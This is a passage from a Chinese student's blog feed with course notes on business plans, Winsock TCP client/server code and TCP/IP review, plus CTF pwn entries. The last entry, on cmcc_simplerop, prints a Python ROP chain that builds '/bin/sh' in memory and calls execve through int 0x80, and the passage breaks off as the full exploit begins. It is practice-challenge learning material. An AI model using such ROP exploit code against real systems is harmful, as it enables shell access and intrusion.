src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155614678.png" srcset="/img/loading.gif" class="" title="image-20200303155614678"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155819865.png" srcset="/img/loading.gif" class="" title="image-20200303155819865"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160141607.png" srcset="/img/loading.gif" class="" title="image-20200303160141607"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160544258.png" srcset="/img/loading.gif" class="" title="image-20200303160544258"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160634611.png" srcset="/img/loading.gif" class="" title="image-20200303160634611"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161012399.png" srcset="/img/loading.gif" class="" title="image-20200303161012399"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161050235.png" srcset="/img/loading.gif" class="" title="image-20200303161050235"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161219645.png" srcset="/img/loading.gif" class="" title="image-20200303161219645"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161303272.png" srcset="/img/loading.gif" class="" title="image-20200303161303272"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161514149.png" srcset="/img/loading.gif" class="" title="image-20200303161514149"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303165428331.png" srcset="/img/loading.gif" class="" title="image-20200303165428331"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103106419.png" srcset="/img/loading.gif" class="" title="image-20200306103106419"><p>分析竞争对手 深入详细 长远目标，现行战略，产品趋势</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103921594.png" srcset="/img/loading.gif" class="" title="image-20200306103921594"><p>分析优劣，内外部威胁，外部机会与内部因素相匹配</p><h2 id="评审要点"><a href="#评审要点" class="headerlink" title="评审要点"></a>评审要点</h2><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182110048.png" srcset="/img/loading.gif" class="" title="image-20200306182110048"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182240857.png" srcset="/img/loading.gif" class="" title="image-20200306182240857"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306190639540.png" srcset="/img/loading.gif" class="" title="image-20200306190639540"> <img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306192421339.png" srcset="/img/loading.gif" class="" title="image-20200306192421339"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306193534013.png" srcset="/img/loading.gif" class="" title="image-20200306193534013"><p>痛点-&gt;解决方案-&gt;证明正确-&gt;商业模式-&gt;市场分析、竞争对手-&gt;商业模式-&gt;取得的成效-&gt;团队，财务，未来</p><p>词汇不要过于专业，也不要太low</p><p>盲审：不涉及产品，拿出数据化的东西</p><p>路演：项目背景，痛点</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络编程</title>
    <link href="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="3-9"><a href="#3-9" class="headerlink" title="3/9"></a>3/9</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113441335.png" srcset="/img/loading.gif" class="" title="image-20200309113441335"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113925329.png" srcset="/img/loading.gif" class="" title="image-20200309113925329"><p>非阻塞模式</p><pre><code class="c++">// TcpServer.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;WINSOCK2.H&gt;   #include &lt;iostream&gt;#pragma comment(lib,&quot;WS2_32.lib&quot;)   #define BUF_SIZE    64      // 缓冲区大小int _tmain(int argc, _TCHAR* argv[]){    WSADATA wsd;                    // WSADATA变量，用于初始化Windows Socket       SOCKET  sServer;                    // 服务器套接字，用于监听客户端请求    SOCKET  sClient;                    // 客户端套接字，用于实现与客户端的通信       int     retVal;                        // 调用各种Socket函数的返回值       char    buf[BUF_SIZE];            // 用于接受客户端数据的缓冲区       // 初始化套接字动态库       if(WSAStartup(MAKEWORD(2,2),&amp;wsd) != 0)       {           printf(&quot;WSAStartup failed !\n&quot;);           return 1;       }         // 创建用于监听的套接字       sServer = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);       unsigned long iMode = 1;    retVal = ioctlsocket(sServer, FIONBIO, &amp;iMode);    if(INVALID_SOCKET == sServer)       {           printf(&quot;socket failed !\n&quot;);           WSACleanup();           return -1;       }         // 设置服务器套接字地址       SOCKADDR_IN addrServ;       addrServ.sin_family = AF_INET;       addrServ.sin_port = htons(9990);        // 监听端口为9990    addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);        // 绑定套接字sServer到本地地址，端口9990      retVal = bind(sServer,(const struct sockaddr*)&amp;addrServ,sizeof(SOCKADDR_IN));       if(SOCKET_ERROR == retVal)       {           printf(&quot;bind failed !\n&quot;);           closesocket(sServer);           WSACleanup();           return -1;       }         // 监听套接字       retVal = listen(sServer,1);       if(SOCKET_ERROR == retVal)       {           printf(&quot;listen failed !\n&quot;);           closesocket(sServer);           WSACleanup();           return -1;       }         // 接受客户请求       printf(&quot;TCP Server start...\n&quot;);    sockaddr_in addrClient;                            // 客户端地址    int addrClientlen = sizeof(addrClient);       while (true)    {        sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen);        if (INVALID_SOCKET == sClient)        {            int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK)            {                Sleep(100);                continue;            }            else            {                printf(&quot;accept failed!\n&quot;);                closesocket(sServer);                WSACleanup();                return -1;            }        }        break;    }    // 循环接收客户端的数据，直接客户端发送quit命令后退出。      while(true)    {        ZeroMemory(buf,BUF_SIZE);                        // 清空接收数据的缓冲区        retVal = recv(sClient,buf,BUFSIZ,0);                //         if(SOCKET_ERROR == retVal )           {               int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK)            {                Sleep(100);                continue;            }            else if (err == WSAETIMEDOUT || err == WSAENETDOWN)            {                printf(&quot;recv failed!\n&quot;);                closesocket(sServer);                closesocket(sClient);                WSACleanup();                return -1;            }        }         if (buf == NULL)            continue;        // 获取当前系统时间        SYSTEMTIME st;        GetLocalTime(&amp;st);        char sDateTime[30];        sprintf(sDateTime, &quot;%4d-%2d-%2d %2d:%2d:%2d&quot;,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);        // 打印输出的信息        printf(&quot;%s, Recv From Client [%s:%d] :%s\n&quot;, sDateTime, inet_ntoa(addrClient.sin_addr), addrClient.sin_port, buf);           // 如果客户端发送quit字符串，则服务器退出        if(strcmp(buf, &quot;quit&quot;) == 0)        {            retVal = send(sClient,&quot;quit&quot;,strlen(&quot;quit&quot;),0);               break;        }        else        // 否则向客户端发送回显字符串        {            char    msg[BUF_SIZE];              sprintf(msg, &quot;Message received - %s&quot;, buf);             retVal = send(sClient, msg, strlen(msg),0);               if(SOCKET_ERROR == retVal)               {                      printf(&quot;send failed !\n&quot;);                    closesocket(sServer);                      closesocket(sClient);                      WSACleanup();                      return -1;               }           }    }    // 释放套接字       closesocket(sServer);       closesocket(sClient);       WSACleanup();       // 暂停，按任意键退出    system(&quot;pause&quot;);    return 0;}</code></pre><pre><code class="c++">// TcpClient.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Winsock2.H&gt;   #include &lt;string&gt;#include &lt;iostream&gt;#pragma comment(lib,&quot;WS2_32.lib&quot;)   #define BUF_SIZE    64          // 缓冲区大小  int _tmain(int argc, _TCHAR* argv[]){    WSADATA     wsd;                    // 用于初始化Windows Socket       SOCKET      sHost;                    // 与服务器进行通信的套接字       SOCKADDR_IN servAddr;            // 服务器地址       char        buf[BUF_SIZE];            // 用于接受数据缓冲区       int         retVal;                            // 调用各种Socket函数的返回值       // 初始化Windows Socket    if(WSAStartup(MAKEWORD(2,2),&amp;wsd) != 0)       {           printf(&quot;WSAStartup failed !\n&quot;);           return 1;       }         // 创建套接字       sHost = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);       if(INVALID_SOCKET == sHost)       {           printf(&quot;socket failed !\n&quot;);           WSACleanup();           return -1;       }        // 设置服务器地址       servAddr.sin_family = AF_INET;       servAddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);        // 用户需要根据实际情况修改    servAddr.sin_port = htons(9990);                                                    // 在实际应用中，建议将服务器的IP地址和端口号保存在配置文件中    int sServerAddlen = sizeof(servAddr);                                                // 计算地址的长度           // 连接服务器       while (true)    {        retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr));        if (SOCKET_ERROR == retVal)        {            int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK || err == WSAEINVAL)            {                Sleep(500);                continue;            }            else if (err == WSAEISCONN)            {                break;            }            else            {                printf(&quot;connect failed !\n&quot;);                closesocket(sHost);                WSACleanup();                return -1;            }        }    }    // 循环向服务器发送字符串，并显示反馈信息。    // 发送quit将使服务器程序退出，同时客户端程序自身也将退出    while(true)    {        // 向服务器发送数据           printf(&quot;Please input a string to send: &quot;);        // 接收输入的数据        std::string str;        std::getline(std::cin, str);        // 将用户输入的数据复制到buf中        ZeroMemory(buf,BUF_SIZE);           strcpy(buf,str.c_str());           if(buf[0]==&#39;\0&#39;)            continue;        // 向服务器发送数据        while (true)        {            retVal = send(sHost, buf, strlen(buf), 0);            //retVal = WSASend(sHost, buf, BUF_SIZE, strlen(buf),0,NULL,NULL);            if (SOCKET_ERROR == retVal)            {                int err = WSAGetLastError();                if (err == WSAEWOULDBLOCK)                {                    Sleep(500);                    continue;                }                else                {                    printf(&quot;send failed!\n&quot;);                    closesocket(sHost);                    WSACleanup();                    return -1;                }            }            break;        }        // 接收服务器回传的数据          while (true)        {            ZeroMemory(buf, BUF_SIZE);            retVal = recv(sHost, buf, sizeof(buf) + 1, 0);            if (SOCKET_ERROR == retVal)            {                int err = WSAGetLastError();                if (err == WSAEWOULDBLOCK)                {                    Sleep(100);                    printf(&quot;waiting back msg!\n&quot;);                    continue;                }                else if (err == WSAETIMEDOUT || err == WSAENETDOWN)                {                    printf(&quot;recv failed!\n&quot;);                    closesocket(sHost);                    WSACleanup();                    return -1;                }                break;            }            break;        }        printf(&quot;Recv From Server: %s\n&quot;,buf);           // 如果收到quit，则退出        if(strcmp(buf, &quot;quit&quot;) == 0)        {            printf(&quot;quit!\n&quot;);            break;        }    }    // 释放资源       closesocket(sHost);       WSACleanup();       // 暂停，按任意键继续    system(&quot;pause&quot;);    return 0;  }</code></pre><h2 id="3-23"><a href="#3-23" class="headerlink" title="3/23"></a>3/23</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323111552979.png" srcset="/img/loading.gif" class="" title="image-20200323111552979"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323113425859.png" srcset="/img/loading.gif" class="" title="image-20200323113425859"><h2 id="3-30"><a href="#3-30" class="headerlink" title="3/30"></a>3/30</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140139366.png" srcset="/img/loading.gif" class="" title="image-20200330140139366"><p>阻塞：适合通信量较少的简单应用，没有完成之前不会返回</p><p>非阻塞:并发强</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140556146.png" srcset="/img/loading.gif" class="" title="image-20200330140556146"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140713774.png" srcset="/img/loading.gif" class="" title="image-20200330140713774"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140911046.png" srcset="/img/loading.gif" class="" title="image-20200330140911046"><h2 id="4-13"><a href="#4-13" class="headerlink" title="4/13"></a>4/13</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200413135556939.png" srcset="/img/loading.gif" class="" title="image-20200413135556939"><h2 id="4-20"><a href="#4-20" class="headerlink" title="4/20"></a>4/20</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200420113827282.png" srcset="/img/loading.gif" class="" title="image-20200420113827282"><h2 id="5-11"><a href="#5-11" class="headerlink" title="5/11"></a>5/11</h2><p>用户类打交道最多的是View视图类，对界面各种操作响应</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCPIP复习</title>
    <link href="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="遗忘记录"><a href="#遗忘记录" class="headerlink" title="遗忘记录"></a>遗忘记录</h1><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>A类地址 公有1~126 </p><table><thead><tr><th align="center">地址类型</th><th align="center">公有</th><th align="center">私有</th></tr></thead><tbody><tr><td align="center">A类</td><td align="center">1 ~ 126</td><td align="center">10.0.0.0 ~ 10.255.255.255</td></tr><tr><td align="center">B类</td><td align="center">128 ~ 191</td><td align="center">172.16.0.0 ~ 172.31.255.255</td></tr><tr><td align="center">C类</td><td align="center">192.0.0.0 ~ 223.255.255.255</td><td align="center">192.168.0.0 ~ 192.168.255.255</td></tr></tbody></table><h2 id="直接交付和间接交付"><a href="#直接交付和间接交付" class="headerlink" title="直接交付和间接交付"></a>直接交付和间接交付</h2><p>直接交付 -&gt; 交给同一个网络地址</p><p>间接交付 -&gt; 经过一个直接交付，给路由器，再给路由器 直到到达同一个网络的路由再给主机</p><h2 id="端到端和点到点"><a href="#端到端和点到点" class="headerlink" title="端到端和点到点"></a>端到端和点到点</h2><p>端到端 -&gt; 进程到进程</p><p>点到点 -&gt; 设备到设备</p><h2 id="三元组五元组"><a href="#三元组五元组" class="headerlink" title="三元组五元组"></a>三元组五元组</h2><p>三元组：协议，IP地址，端口</p><p>五元组：三元 + 源IP，源端口</p><h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP 可靠性"></a>TCP 可靠性</h3><ul><li>流量控制：滑动窗口 } 发送窗口</li><li>拥塞控制： 拥塞窗口 重转定时器</li><li>差错控制</li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><ul><li>流套接字：TCP 适合大量数据 单播</li><li>数据报套接字： UDP</li><li>原始套接字：编写自定底层协议</li></ul><h3 id="IP多播"><a href="#IP多播" class="headerlink" title="IP多播"></a>IP多播</h3><p>==五个前提？==</p><p>多播地址 224.0.0.0 ~ 239.255.255.255</p><p>IP地址的低23位替换mac地址低23位，第24位为0</p><h1 id="第一章协议组成"><a href="#第一章协议组成" class="headerlink" title="第一章协议组成"></a>第一章协议组成</h1><ul><li>语义</li><li>语法</li><li>时序</li></ul><h2 id="OIS七层模型"><a href="#OIS七层模型" class="headerlink" title="OIS七层模型"></a>OIS七层模型</h2><table><thead><tr><th align="center">层次</th><th align="center">名称</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center">报文/消息</td><td align="center"></td></tr><tr><td align="center">表示层</td><td align="center"></td><td align="center">定义数据格式和加密标准。将一种格式转换成另一种格式</td></tr><tr><td align="center">会话层</td><td align="center"></td><td align="center">验证会话双方，提供身份验证</td></tr><tr><td align="center">传输层</td><td align="center">段</td><td align="center">网络节点之间的可靠数据传输</td></tr><tr><td align="center">网络层</td><td align="center">包</td><td align="center"></td></tr><tr><td align="center">链路层</td><td align="center">帧</td><td align="center"></td></tr><tr><td align="center">物理层</td><td align="center">流</td><td align="center"></td></tr></tbody></table><h2 id="TCP-IP四层"><a href="#TCP-IP四层" class="headerlink" title="TCP/IP四层"></a>TCP/IP四层</h2><table><thead><tr><th>层次</th><th></th><th></th></tr></thead><tbody><tr><td>应用层</td><td></td><td></td></tr><tr><td>传输层</td><td>提供端到端通信</td><td></td></tr><tr><td>网络层</td><td>IP数据包传输、路由选择、流量控制和拥塞控制</td><td></td></tr><tr><td>网络接口层</td><td></td><td></td></tr></tbody></table><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164157071.png" srcset="/img/loading.gif" class="" title="image-20200104164157071"><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164216242.png" srcset="/img/loading.gif" class="" title="image-20200104164216242"><h2 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h2><p>以太网MTU最大传输单元，最大值1500字节</p><p>基本概念：协议，封装，服务，接口</p><h1 id="第二章局域网协议"><a href="#第二章局域网协议" class="headerlink" title="第二章局域网协议"></a>第二章局域网协议</h1><p>IEEE802.3 CSMA/CD 总线媒体访问</p><p>802.4 令牌总线</p><p>802.5 令牌环</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>逻辑链路控制子层</p><p>介质访问控制子层</p><h2 id="MAC寻址"><a href="#MAC寻址" class="headerlink" title="MAC寻址"></a>MAC寻址</h2><p>广播帧：目的MAC为广播地址（全1）</p><h2 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet II帧格式"></a>Ethernet II帧格式</h2><h2 id="记忆-1"><a href="#记忆-1" class="headerlink" title="记忆"></a>记忆</h2><p>交换机工作在数据链路层</p><p>冲突域：每个节点都能接收到所有被发送的帧</p><p>广播域：能接收任一发出的广播</p><p>路由器隔绝广播</p><p>网桥：有两网卡，接两端线缆</p><p>链路层协议：IEEE802.3 .4 .5 SLIP(串行线路Internet协议)，CSLIP()，PPP(点对点)</p><p>SLIP：需要先知道ip，并且没有校验</p><h1 id="第三章地址解析协议"><a href="#第三章地址解析协议" class="headerlink" title="第三章地址解析协议"></a>第三章地址解析协议</h1><p>ARP和RARP</p><p>静态映射：通过地址映射表与物理地址之间的映射</p><p>动态映射：自动维护逻辑地址和物理地址</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>广播请求，单播相应</p><p>物理层广播，IP路由（网络层）不会转发</p><h3 id="跨子网的地址解析"><a href="#跨子网的地址解析" class="headerlink" title="跨子网的地址解析"></a>跨子网的地址解析</h3><p>？？</p><h2 id="记忆-2"><a href="#记忆-2" class="headerlink" title="记忆"></a>记忆</h2><p>若分配dhcp到的ip为169.254开头，说明dhcp服务有问题</p><h1 id="第四章IP协议"><a href="#第四章IP协议" class="headerlink" title="第四章IP协议"></a>第四章IP协议</h1><p>分片数据大小必须为8字节的整数倍，否则无法表述偏移量</p><h1 id="第五章ICMP协议"><a href="#第五章ICMP协议" class="headerlink" title="第五章ICMP协议"></a>第五章ICMP协议</h1><p>功能</p><ul><li>报告差错</li><li>查询</li></ul><h2 id="差错报文"><a href="#差错报文" class="headerlink" title="差错报文"></a>差错报文</h2><p>差错报告报文：当路由器或目的主机处理IP数据报遇到问题时，查询报文以请求/应答形式成对出现</p><p>差错报告报文：源抑制 源站抑制报告，降低源发包速度</p><p>目的不可达：网络不可达，主机不可达，协议不可达和端口不可达</p><p>网络不可达可能路由表或者目的地址有错。主机不可达可能信宿机不在运行中或不存在，并说明网络可达。</p><h3 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h3><p>目的主机进行分片重组时会启动重组计时器，一旦超时就会丢弃正在重组的数据报，并产生ICMP数据报超时报告 </p><h3 id="重定向报文"><a href="#重定向报文" class="headerlink" title="重定向报文"></a>重定向报文</h3><p>路由收到报文后，判断是否最佳选择，不是就发送重定向报文，通知源主机修改路由表，最佳下一跳路由器的IP地址</p><h3 id="计算应答时间"><a href="#计算应答时间" class="headerlink" title="计算应答时间"></a>计算应答时间</h3><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104202342626.png" srcset="/img/loading.gif" class="" title="image-20200104202342626"><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>ping和tracert</p><h1 id="第六章IP路由"><a href="#第六章IP路由" class="headerlink" title="第六章IP路由"></a>第六章IP路由</h1><p>##RIP 距离向量路由协议</p><p>==通过度量值判断路径的好坏==</p><p>包含：路径长度，跳数，可靠性，延迟，带宽，负载，通讯费用</p><p>RIP V1 不支持VLSM V2 支持认证</p><h2 id="OSPF-链路状态路由协议"><a href="#OSPF-链路状态路由协议" class="headerlink" title="OSPF 链路状态路由协议"></a>OSPF 链路状态路由协议</h2><p>==通过管理距离判断路径好坏==</p><p>每种路径由协议分配信任等级，根据算法的好坏</p><h2 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h2><p>边界网关协议，用于自治系统之间</p><h1 id="第七章-TCP-UDP"><a href="#第七章-TCP-UDP" class="headerlink" title="第七章 TCP UDP"></a>第七章 TCP UDP</h1><p>小于1024端口做公用端口，全局方式进行分配</p><p>1024～65535 临时端口</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>面向字节流。TCP使用缓冲区</p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>SEQ 是随机数</p><p>客户端</p><p>第一次：SEQ = m , SYN = 1</p><p>服务器</p><p>第二次：SEQ = n，AN = m + 1，SYN=1，ACK=1</p><p>客户端</p><p>第三次：SEQ = m + 1 , AN = n +1 , ACK = 1</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>面向报文 使用队列</p><h1 id="第九章DHCP协议"><a href="#第九章DHCP协议" class="headerlink" title="第九章DHCP协议"></a>第九章DHCP协议</h1><p>169.254 本地链路地址</p><h2 id="DHCP报文格式"><a href="#DHCP报文格式" class="headerlink" title="DHCP报文格式"></a>DHCP报文格式</h2><p>网关IP地址 如果跨网段使用DHCP中继，此字段包含中继代理的ip地址</p><h1 id="第十章应用层协议"><a href="#第十章应用层协议" class="headerlink" title="第十章应用层协议"></a>第十章应用层协议</h1><p>windows域 WINS协议</p><p>DNS递归解析，反向解析</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2019_拟态-STKOF</title>
    <link href="/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/"/>
    <url>/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019_拟态-STKOF"></a>强网杯2019_拟态-STKOF</h1><p>这题给了两文件，分别是32和64位的，32位的由于是静态链接，直接自动生成就能打通。</p><p>打到buu服务器上时，exp是随机打到两个程序中的一个的，就我测试来看64位的出现多点</p><p>搜了一搜，当时比赛好像是要一个exp打通两个程序才行</p><p>备份学习链接：</p><p><a href="https://blog.csdn.net/qq_41071646/article/details/90607928" target="_blank" rel="noopener">强网杯 签到re 签到pwn 题解</a></p><p><a href="https://www.anquanke.com/post/id/195801?from=singlemessage" target="_blank" rel="noopener">拟态防御型Pwn题做题思路总结</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget&amp;系统调用-cmcc_simplerop</title>
    <link href="/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/"/>
    <url>/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPgadget-amp-系统调用-cmcc-simplerop"><a href="#ROPgadget-amp-系统调用-cmcc-simplerop" class="headerlink" title="ROPgadget&amp;系统调用-cmcc_simplerop"></a>ROPgadget&amp;系统调用-cmcc_simplerop</h1><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141031239.png" srcset="/img/loading.gif" class="" title="image-20200204141031239"><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141049853.png" srcset="/img/loading.gif" class="" title="image-20200204141049853"><p>第一反应就是用ROPgadget自动生成ropchains</p><p>但在这里不行，算出来的偏移是0x20，那么只有68字节给ropchains了</p><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141245719.png" srcset="/img/loading.gif" class="" title="image-20200204141245719"><p>而自动生成的都太长了= =，只能手动调整ropchains长度</p><blockquote><p>参考<a href="http://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hitcon-training-writeup/</a></p></blockquote><pre><code class="python">    from struct import pack     pop_edx_ecx_ebx = 0x0806e850    payload = cyclic(0x14 + 12)     p = lambda x : pack(&#39;I&#39;, x)    IMAGE_BASE_0 = 0x08048000 # ./simplerop    rebase_0 = lambda x : p(x + IMAGE_BASE_0)    rop = &#39;&#39;    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/bin&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3060)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;     rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/sh\x00&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3064)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;    rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)    rop += p(0)    rop += p(0)    rop += rebase_0(0x000a3060)    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += p(0x0000000b)    rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;</code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="python"># -*- 